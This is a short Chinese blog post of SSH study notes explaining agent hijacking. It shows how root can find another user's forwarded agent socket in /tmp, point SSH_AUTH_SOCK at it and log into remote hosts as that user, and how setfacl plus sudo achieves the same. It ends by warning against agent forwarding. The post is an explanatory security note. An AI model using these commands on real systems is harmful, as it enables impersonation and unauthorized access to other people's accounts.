title:SSH学习笔记之--Agent Hijacking 
Date: 2015-08-27 10:20
Modified: 2015-08-27 10:20
Category: SSH 
Tags: SSH, anget hijacking
Slug: ssh-agent-hijacking 
Authors: nullne 
####Agent Hijacking
agent forwarding在安全方面有一个好处就是用户的私钥永远不会出现在远端服务器或者传输过程中。但却会面临另外一个安全隐患：agent hijacking
	  
ssh实现的每一个方式都会提供一种让client向agent请求服务的机制，在UNIX/Linux上是用/tmp/文件夹下面的UNIX domain socket实现的。  
	
这个文件是被系统重度保护的，只有当前进程的用户才能访问，并且被保护在相应地子文件夹下面。但是任何措施都不能防止root用户访问任何一个文件。  
	
root用户可以通过该domain socket连接该socket对应的用户能够访问的任何机器，并且是以这个用户的身份。  
	
下面是简单的实现方式：

    :::bash
	ls -l /tmp/ssh*      #look for somebody's agent socket
	/tmp/ssh-CXkd6094:
	total 24
	srwxr-xr-x    1 steve    steve           0 Aug 30 08:46 agent.6094=
		
	export SSH_AUTH_SOCK=/tmp/ssh-CXkd6094/agent.6094

	ssh steve@remotesystem

	remote$                  # Gotcha! Logged in as "steve" user on remote system!

如果没有root权限也没关系，可能你有sudo的权限，同样下面的操作也可以完成相同的目的：  

    :::bash
	localhost$ ssh -A user@host
	$ setfacl -m otheruser:x   $(dirname "$SSH_AUTH_SOCK")
	$ setfacl -m otheruser:rwx "$SSH_AUTH_SOCK"
	$ sudo su - otheruser
	$ ssh server
	otheruser@server$

目前没有任何技术手段防止root用户劫持SSH agent socket，所以鉴于安全方面的考虑，慎用ssh angent forwarding.
